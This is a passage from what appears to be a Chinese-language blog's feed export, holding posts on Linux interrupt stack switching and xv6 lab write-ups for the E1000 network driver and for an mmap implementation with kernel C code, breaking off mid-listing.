pt_regs</a><strong>push</strong>到当前进程的内核栈中。</p><p>恢复上下文应该是其逆操作，这里就不在赘述了。</p><h1 id="栈切换"><a href="#栈切换" class="headerlink" title="栈切换"></a>栈切换</h1><p>根据上面的分析，对于普通的中断来说，其最多涉及到<strong>trampoline栈</strong>和<strong>内核栈</strong>的切换，实际上还可能有<strong>中断栈</strong>的切换，如<a href="https://github.com/torvalds/linux/blob/2ccdd1b13c591d306f0401d98dedc4bdcd02b421/arch/x86/include/asm/idtentry.h#L179-L207">DEFINE_IDTENTRY_IRQ</a>宏所示，其在<code>func</code>的wrapper中，添加<code>run_irq_on_irqstack_cond()</code>，完成<strong>中断栈</strong>的切换</p><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><ol><li><a href="https://xinqiu.gitbooks.io/linux-insides-cn/content/Interrupts/linux-interrupts-1.html">Interrupts and Interrupt Handling</a></li><li><a href="http://sholck.top/archives/20.html">x86下系统调用</a></li><li><a href="https://zhuanlan.zhihu.com/p/121630145">Linux 中断/异常的准备与退出</a></li><li><a href="https://heapdump.cn/article/4514433">深入理解Linux中断机制</a></li></ol>]]></content>
      
      
      <categories>
          
          <category> 内核 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> linux </tag>
            
            <tag> 内核 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>xv6-十一</title>
      <link href="/2022/10/22/xv6-%E5%8D%81%E4%B8%80/"/>
      <url>/2022/10/22/xv6-%E5%8D%81%E4%B8%80/</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>这篇博客研究<strong>xv6</strong>的<strong>设备驱动</strong>机制</p><h1 id="Lab-networking"><a href="#Lab-networking" class="headerlink" title="Lab networking"></a>Lab networking</h1><p>本次<a href="https://pdos.csail.mit.edu/6.828/2020/labs/net.html">lab</a>用来实现<strong>xv6</strong>的<strong>E1000(Network Interfact Card)</strong>的<strong>设备驱动</strong></p><h2 id="要求"><a href="#要求" class="headerlink" title="要求"></a>要求</h2><blockquote><p>You’ll use a network device called the E1000 to handle network communication. To xv6 (and the driver you write), the E1000 looks like a real piece of hardware connected to a real Ethernet local area network (LAN). In fact, the E1000 your driver will talk to is an emulation provided by qemu, connected to a LAN that is also emulated by qemu. On this emulated LAN, xv6 (the “guest”) has an IP address of 10.0.2.15. Qemu also arranges for the computer running qemu to appear on the LAN with IP address 10.0.2.2. When xv6 uses the E1000 to send a packet to 10.0.2.2, qemu delivers the packet to the appropriate application on the (real) computer on which you’re running qemu (the “host”).</p><p>Your job is to complete <strong>e1000_transmit()</strong> and <strong>e1000_recv()</strong>, both in <strong>kernel/e1000.c</strong>, so that the driver can transmit and receive packets. You are done when <strong>make grade</strong> says your solution passes all the tests.</p><p>The <strong>e1000_init()</strong> function we provide you in <strong>e1000.c</strong> configures the E1000 to read packets to be transmitted from RAM, and to write received packets to RAM. This technique is called DMA, for direct memory access, referring to the fact that the E1000 hardware directly writes and reads packets to/from RAM.</p><p>Because bursts of packets might arrive faster than the driver can process them, <strong>e1000_init()</strong> provides the E1000 with multiple buffers into which the E1000 can write packets. The E1000 requires these buffers to be described by an array of “descriptors” in RAM; each descriptor contains an address in RAM where the E1000 can write a received packet. <strong>struct rx_desc</strong> describes the descriptor format. The array of descriptors is called the receive ring, or receive queue. It’s a circular ring in the sense that when the card or driver reaches the end of the array, it wraps back to the beginning. <strong>e1000_init()</strong> allocates <strong>mbuf</strong> packet buffers for the E1000 to DMA into, using <strong>mbufalloc()</strong>. There is also a transmit ring into which the driver places packets it wants the E1000 to send. <strong>e1000_init()</strong> configures the two rings to have size <strong>RX_RING_SIZE</strong> and <strong>TX_RING_SIZE</strong>.</p><p>When the network stack in <strong>net.c</strong> needs to send a packet, it calls <strong>e1000_transmit()</strong> with an mbuf that holds the packet to be sent. Your transmit code must place a pointer to the packet data in a descriptor in the TX (transmit) ring. <strong>struct tx_desc</strong> describes the descriptor format. You will need to ensure that each mbuf is eventually freed, but only after the E1000 has finished transmitting the packet (the E1000 sets the <strong>E1000_TXD_STAT_DD</strong> bit in the descriptor to indicate this).</p><p>When the E1000 receives each packet from the ethernet, it first DMAs the packet to the mbuf pointed to by the next RX (receive) ring descriptor, and then generates an interrupt. Your <strong>e1000_recv()</strong> code must scan the RX ring and deliver each new packet’s mbuf to the network stack (in <strong>net.c</strong>) by calling <strong>net_rx()</strong>. You will then need to allocate a new mbuf and place it into the descriptor, so that when the E1000 reaches that point in the RX ring again it finds a fresh buffer into which to DMA a new packet.</p><p>In addition to reading and writing the descriptor rings in RAM, your driver will need to interact with the E1000 through its memory-mapped control registers, to detect when received packets are available and to inform the E1000 that the driver has filled in some TX descriptors with packets to send. The global variable <strong>regs</strong> holds a pointer to the E1000’s first control register; your driver can get at the other registers by indexing <strong>regs</strong> as an array. You’ll need to use indices <strong>E1000_RDT</strong> and <strong>E1000_TDT</strong> in particular.</p></blockquote><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><h2 id="实现"><a href="#实现" class="headerlink" title="实现"></a>实现</h2><h2 id="结果"><a href="#结果" class="headerlink" title="结果"></a>结果</h2><p>执行如下命令，完成实验测试<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">make grade</span><br></pre></td></tr></table></figure><br><img src="networking实验结果.png" alt="networking实验结果"></p>]]></content>
      
      
      <categories>
          
          <category> 手写 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 内核 </tag>
            
            <tag> 手写 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>xv6-十</title>
      <link href="/2022/10/08/xv6-%E5%8D%81/"/>
      <url>/2022/10/08/xv6-%E5%8D%81/</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>这篇博客研究<strong>xv6</strong>的<strong>虚拟内存</strong>的管理机制</p><h1 id="Lab-mmap"><a href="#Lab-mmap" class="headerlink" title="Lab mmap"></a>Lab mmap</h1><p>本次<a href="https://pdos.csail.mit.edu/6.828/2020/labs/mmap.html">lab</a>用来实现<strong>xv6</strong>的<strong>虚拟内存</strong>的管理机制</p><h2 id="要求"><a href="#要求" class="headerlink" title="要求"></a>要求</h2><blockquote><p><strong>mmap</strong> can be called in many ways, yet this lab requires only a subset of its features relevant to memory-mapping a file. You can assume that <strong>addr</strong> will always be zero, meaning that the kernel should decide the virtual address at which to map the file. <strong>mmap</strong> returns that address, or 0xffffffffffffffff if it fails. <strong>length</strong> is the number of bytes to map; it might not be the same as the file’s length. <strong>prot</strong> indicates whether the memory should be mapped readable, writeable, and/or executable; you can assume that <strong>prot</strong> is <strong>PROT_READ</strong> or <strong>PROT_WRITE</strong> or both. <strong>flags</strong> will be either <strong>MAP_SHARED</strong>, meaning that modifications to the mapped memory should be written back to the file, or <strong>MAP_PRIVATE</strong>, meaning that they should not. You don’t have to implement any other bits in <strong>flags</strong>. <strong>fd</strong> is the open file descriptor of the file to map. You can assume <strong>offset</strong> is zero (it’s the starting point in the file at which to map).</p><p><strong>munmap</strong> should remove mmap mappings in the indicated address range. If the process has modified the memory and has it mapped <strong>MAP_SHARED</strong>, the modifications should first be written to the file. An <strong>munmap</strong> call might cover only a portion of an mmap-ed region, but you can assume that it will either unmap at the start, or at the end, or the whole region (but not punch a hole in the middle of a region). </p><p>You should implement enough <strong>mmap</strong> and <strong>munmap</strong> functionality to make the <strong>mmaptest</strong> test program work. If <strong>mmaptest</strong> doesn’t use a <strong>mmap</strong> feature, you don’t need to implement that feature. </p><p>When you’re done, you should see this output:<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">$ mmaptest</span><br><span class="line">mmap_test starting</span><br><span class="line"><span class="built_in">test</span> mmap f</span><br><span class="line"><span class="built_in">test</span> mmap f: OK</span><br><span class="line"><span class="built_in">test</span> mmap private</span><br><span class="line"><span class="built_in">test</span> mmap private: OK</span><br><span class="line"><span class="built_in">test</span> mmap read-only</span><br><span class="line"><span class="built_in">test</span> mmap read-only: OK</span><br><span class="line"><span class="built_in">test</span> mmap <span class="built_in">read</span>/write</span><br><span class="line"><span class="built_in">test</span> mmap <span class="built_in">read</span>/write: OK</span><br><span class="line"><span class="built_in">test</span> mmap dirty</span><br><span class="line"><span class="built_in">test</span> mmap dirty: OK</span><br><span class="line"><span class="built_in">test</span> not-mapped unmap</span><br><span class="line"><span class="built_in">test</span> not-mapped unmap: OK</span><br><span class="line"><span class="built_in">test</span> mmap two files</span><br><span class="line"><span class="built_in">test</span> mmap two files: OK</span><br><span class="line">mmap_test: ALL OK</span><br><span class="line">fork_test starting</span><br><span class="line">fork_test OK</span><br><span class="line">mmaptest: all tests succeeded</span><br><span class="line">$ usertests</span><br><span class="line">usertests starting</span><br><span class="line">...</span><br><span class="line">ALL TESTS PASSED</span><br><span class="line">$ </span><br></pre></td></tr></table></figure></p></blockquote><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>实际上，<strong>mmap()</strong>和<strong>munmap()</strong>是<strong>*nix</strong>系统中，管理进程<strong>virtual address space</strong>的重要途径之一。</p><p>在<strong>xv6</strong>中，进程的<strong>虚拟地址空间</strong>布局大致如下所示<br><img src="vasl.png" alt="进程虚拟地址空间布局"></p><ol><li>ELF程序、进程stack<br><strong>xv6</strong>会在<strong>exec()</strong>(kernel/exec.c:42)中，将<strong>可执行文件*载入到进程的虚拟地址空间的</strong>起始地址<strong>(0)处；在</strong>exec()**(kernel/exec:67)中，初始化用户态的栈空间信息</li><li>进程heap<br><strong>xv6</strong>通过管理<strong>sz</strong>指针(类似于Linux的brk指针)，从而在进程运行时，动态的分配或释放堆空间。进程可以通过<strong>sbrk()</strong>系统调用，向<strong>xv6</strong>申请分配或释放相关的<strong>heap</strong>。这部分空间向高地址方向生长</li><li>trampoline、trapframe<br><strong>xv6</strong>会将<strong>uservec</strong>(kernel/trampoline.S:16)和<strong>userret</strong>(kernel/trampoline.S:88)物理页，在<strong>内核地址空间</strong>和进程的<strong>虚拟地址空间</strong>，都映射到<strong>trampoline</strong>处。这样确保进程在陷入内核或从内核返回时，即使页表进行了切换，仍能执行同一份代码。除此以外，为了在陷入内核前，保存当前进程的上下文，内核会为每个进程分配相关的物理页保存其上下文，并将其上下文所在的物理页映射到对应进程的<strong>TRAPFRAME</strong>处</li><li>进程map<br>由于进程heap向高地址方向动态生长，则在运行过程中，高地址空间还剩余了未使用空间，则可以将其当做进程的map区域。即进程可以从<strong>trampoline、trapframe</strong>区域的下边界开始，向低地址方向动态生长</li></ol><p>当选定进程map的地址空间位置后，下一步需要考虑的则是如何管理每一个map区域。这里为了实现简单，就通过在进程的<strong>struct proc</strong>(kernel/proc.h:86)中添加有序数组进行管理，每一个数组元素都是一个连续的map区域</p><h2 id="实现"><a href="#实现" class="headerlink" title="实现"></a>实现</h2><p>首先，添加管理<strong>map</strong>区域的数据结构，如下所示<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// kernel/proc.h</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * @struct uvmarea is used to manage each process mmap mappings.</span></span><br><span class="line"><span class="comment"> * Each @struct uvmarea represents a continuous, non-overlapped</span></span><br><span class="line"><span class="comment"> * mmap mappings in process. And each process has their own</span></span><br><span class="line"><span class="comment"> * @struct uvmareas array, stored in @struct proc. This array</span></span><br><span class="line"><span class="comment"> * is sorted descend by @st field.</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * When process requests for a map mapping, kernel does not</span></span><br><span class="line"><span class="comment"> * alloc the physical memory, or map the user virtual memory to</span></span><br><span class="line"><span class="comment"> * the physical memory in pagetable. Instead, kernel will only allocates the</span></span><br><span class="line"><span class="comment"> * @struct uvmarea. Only when process triggers the page-fault does kernel</span></span><br><span class="line"><span class="comment"> * alloc the physical memory and map the relative user virtual memory to this</span></span><br><span class="line"><span class="comment"> * physical memory.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">uvmarea</span> &#123;</span></span><br><span class="line"></span><br><span class="line">  uint64 st;                  <span class="comment">// Begin address of the map mapping area</span></span><br><span class="line">  uint64 ed;                  <span class="comment">// End border of the map mapping area</span></span><br><span class="line">                              <span class="comment">// uvmarea range should be [st, ed)</span></span><br><span class="line"></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">file</span> *<span class="title">f</span>;</span>             <span class="comment">// Open file descriptor of the file to map</span></span><br><span class="line">  uint offset;                <span class="comment">// Starting point in the file at which to map</span></span><br><span class="line">  <span class="type">int</span> prot;                   <span class="comment">// The desired memory protection</span></span><br><span class="line">  <span class="type">int</span> flags;                  <span class="comment">// Whether updates are carried through to</span></span><br><span class="line">                              <span class="comment">// the underlying file</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Per-process state</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">proc</span> &#123;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">spinlock</span> <span class="title">lock</span>;</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">// p-&gt;lock must be held when using these:</span></span><br><span class="line">  <span class="class"><span class="keyword">enum</span> <span class="title">procstate</span> <span class="title">state</span>;</span>        <span class="comment">// Process state</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">proc</span> *<span class="title">parent</span>;</span>         <span class="comment">// Parent process</span></span><br><span class="line">  <span class="type">void</span> *chan;                  <span class="comment">// If non-zero, sleeping on chan</span></span><br><span class="line">  <span class="type">int</span> killed;                  <span class="comment">// If non-zero, have been killed</span></span><br><span class="line">  <span class="type">int</span> xstate;                  <span class="comment">// Exit status to be returned to parent&#x27;s wait</span></span><br><span class="line">  <span class="type">int</span> pid;                     <span class="comment">// Process ID</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">// these are private to the process, so p-&gt;lock need not be held.</span></span><br><span class="line">  uint64 kstack;               <span class="comment">// Virtual address of kernel stack</span></span><br><span class="line">  uint64 sz;                   <span class="comment">// Size of process memory (bytes)</span></span><br><span class="line">  <span class="type">pagetable_t</span> pagetable;       <span class="comment">// User page table</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">trapframe</span> *<span class="title">trapframe</span>;</span> <span class="comment">// data page for trampoline.S</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">context</span> <span class="title">context</span>;</span>      <span class="comment">// swtch() here to run process</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">file</span> *<span class="title">ofile</span>[<span class="title">NOFILE</span>];</span>  <span class="comment">// Open files</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">inode</span> *<span class="title">cwd</span>;</span>           <span class="comment">// Current directory</span></span><br><span class="line">  <span class="type">char</span> name[<span class="number">16</span>];               <span class="comment">// Process name (debugging)</span></span><br><span class="line"></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">uvmarea</span> <span class="title">vm</span>[<span class="title">NUVMAREA</span>];</span> <span class="comment">// User virtual memory areas</span></span><br><span class="line">  uint64 nvm;                  <span class="comment">// Number of vm area</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><br>这里使用<strong>struct uvmarea</strong>管理进程的每一个map区域，其包含传入<strong>mmap()</strong>系统调用的用来描述<strong>map区域</strong>的所有参数信息</p><p>其次，为了实现方便，每一次进程调用<strong>mmap()</strong>时，内核从<strong>vm</strong>有序数组中选取起始地址最小的，作为该次<strong>map区域</strong>地址上界。之后初始化<strong>struct uvmarea</strong>元素，并将其插入到<strong>vm</strong>有序数组中，如下所示<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// kernel/mmap.c</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * map files or devices into memory</span></span><br><span class="line"><span class="comment"> * void *mmap(void *addr, uint length, int prot, int flags,</span></span><br><span class="line"><span class="comment"> *            int fd, uint offset)</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * @addr: You can assume that @addr will always be zero, meaning</span></span><br><span class="line"><span class="comment"> * that the kernel should decide the virtual address at which to</span></span><br><span class="line"><span class="comment"> * map the file.</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * @length: @length is the number of bytes to map; it might not</span></span><br><span class="line"><span class="comment"> * be the same as the file&#x27;s length.</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * @prot: @prot indicates whether the memory should be mapped</span></span><br><span class="line"><span class="comment"> * readable, writeable, and/or executable; you can assume that</span></span><br><span class="line"><span class="comment"> * @prot is PROT_READ or PROT_WRITE or both.</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * @flags: @flags will be either MAP_SHARED, meaning that modifications</span></span><br><span class="line"><span class="comment"> * to the mapped memory should be written back to the file,</span></span><br><span class="line"><span class="comment"> * or MAP_PRIVATE, meaning that they should not.</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * @fd: @fd is the open file descriptor of the file to map.</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * @offset: You can assume @offset is zero (it&#x27;s the starting</span></span><br><span class="line"><span class="comment"> * point in the file at which to map).</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * @return: mmap returns the virtual address that kernel decides to map,</span></span><br><span class="line"><span class="comment"> * or 0xffffffffffffffff if it fails.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">static</span> uint64 <span class="title function_">mmap</span><span class="params">(<span class="type">void</span> *addr, uint length, <span class="type">int</span> prot,</span></span><br><span class="line"><span class="params">                   <span class="type">int</span> flags, <span class="type">int</span> fd, uint offset)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">file</span> *<span class="title">f</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">proc</span> *<span class="title">p</span> =</span> myproc();</span><br><span class="line">    uint64 address = (uint64)addr;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Kernel only supports NUVMAREA elements in struct proc vm arrays */</span></span><br><span class="line">    <span class="keyword">if</span>(p-&gt;nvm &gt;= NUVMAREA)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* do some sanity check to ensure that @addr is 0 */</span></span><br><span class="line">    assert(address == <span class="number">0</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">/* do some sanity check to ensure that</span></span><br><span class="line"><span class="comment">     * @prot is PROT_READ or PROT_WRITE or both.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    assert(((prot &amp; (PROT_READ | PROT_WRITE)) != <span class="number">0</span>) &amp;&amp;</span><br><span class="line">           ((prot &amp; ~(PROT_READ | PROT_WRITE)) == <span class="number">0</span>));</span><br><span class="line">    </span><br><span class="line">    <span class="comment">/* do some sanity check to ensure that</span></span><br><span class="line"><span class="comment">     * @flags is MAP_SHARED or MAP_PRIVATE</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    assert((flags == MAP_SHARED) || (flags == MAP_PRIVATE));</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* do some sanity check to ensure that</span></span><br><span class="line"><span class="comment">     * @fd is a valid file descriptor</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    assert((fd &gt;= <span class="number">0</span>) &amp;&amp; (fd &lt; NOFILE) &amp;&amp;</span><br><span class="line">           ((f = p-&gt;ofile[fd]) != <span class="number">0</span>));</span><br><span class="line">    </span><br><span class="line">    <span class="comment">/* do some sanity check to ensure that</span></span><br><span class="line"><span class="comment">     * f&#x27;s mode, prot and flags is valid combinartion</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="comment">/* PROT_READ only when f&#x27;s mode is readable */</span></span><br><span class="line">    <span class="keyword">if</span>((prot &amp; PROT_READ) != <span class="number">0</span> &amp;&amp; f-&gt;readable == <span class="number">0</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    <span class="comment">/* MAP_SHARED, PROT_WRITE only when f&#x27;s mode is writable */</span></span><br><span class="line">    <span class="keyword">if</span>(flags == MAP_SHARED &amp;&amp; (prot &amp; PROT_WRITE) != <span class="number">0</span> &amp;&amp;</span><br><span class="line">       f-&gt;writable == <span class="number">0</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* increase the struct file to avoid use-after-free */</span></span><br><span class="line">    filedup(f);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* For the struct proc vm arrays is sorted descend by st field.</span></span><br><span class="line"><span class="comment">     * So we can choose the first element&#x27;s st field, as this mapping</span></span><br><span class="line"><span class="comment">     * end border. If array is empty, just select the mmap</span></span><br><span class="line"><span class="comment">     * border(MMAPBASE) as this mapping end border.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">if</span>(p-&gt;nvm == <span class="number">0</span>)</span><br><span class="line">        address = MMAPBASE;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        address = PGROUNDDOWN(p-&gt;vm[p-&gt;nvm - <span class="number">1</span>].st);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">/* do some sanity check for end border</span></span><br><span class="line"><span class="comment">     * - address should be aligned to PGSIZE</span></span><br><span class="line"><span class="comment">     * - remain space should be bigger enough for this</span></span><br><span class="line"><span class="comment">     * mapping.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">if</span>((length &gt; address) || ((address - PGROUNDUP(length)) &lt; p-&gt;sz)) &#123;</span><br><span class="line">        fileclose(f);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* calculate the start address */</span></span><br><span class="line">    address -= PGROUNDUP(length);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Create PTEs for virtual addresses.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * Kernel will only use mappages to create PTEs, so</span></span><br><span class="line"><span class="comment">     * its @pa argument should be 0. Its physical memory</span></span><br><span class="line"><span class="comment">     * allocating and mapping should be delayed in</span></span><br><span class="line"><span class="comment">     * page fault handle, so its @perm should not set</span></span><br><span class="line"><span class="comment">     * PTE_U flag, which can triggers the page fault.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; PGROUNDUP(length); i += PGSIZE) &#123;</span><br><span class="line">        <span class="keyword">if</span>(mappages(p-&gt;pagetable, address + i, PGSIZE,</span><br><span class="line">                    <span class="number">0</span>, prot2perm(prot)) == <span class="number">-1</span>) &#123;</span><br><span class="line">            mmap_uvmunmap(p-&gt;pagetable, address, i / PGSIZE);</span><br><span class="line">            fileclose(f);</span><br><span class="line">            <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Insert the uvm area in struct proc&#x27;s struct uvmarea arrays,</span></span><br><span class="line"><span class="comment">     * to trace this mmap mapping. Because arrays is sorted descend,</span></span><br><span class="line"><span class="comment">     * kernel just need to insert the element in the tail.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * This uvmarea is used to alloc the physical memory and map to</span></span><br><span class="line"><span class="comment">     * the virtuam memory traced by struct uvmarea, when triggering</span></span><br><span class="line"><span class="comment">     * page-fault.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    p-&gt;vm[p-&gt;nvm++] = (<span class="keyword">struct</span> uvmarea)&#123;</span><br><span class="line">        .st = address,</span><br><span class="line">        .ed = address + length,</span><br><span class="line">        .f = f,</span><br><span class="line">        .offset = offset,</span><br><span class="line">        .prot = prot,</span><br><span class="line">        .flags = flags,</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> address;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>需要注意的是，为了提高效率，这里在进行<strong>mmap()</strong>时，仅仅分配了虚拟地址空间(即创建了PTE)，并没有分配实际的物理页，并且该虚拟页的权限也没有<strong>PTE_U</strong>。这样，当进程访问<strong>mmap()</strong>的地址空间时，会触发<strong>page fault</strong>，内核可以在处理该<strong>page fault</strong>时，在实际进行物理地址页的分配和映射即可，如下所示<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span 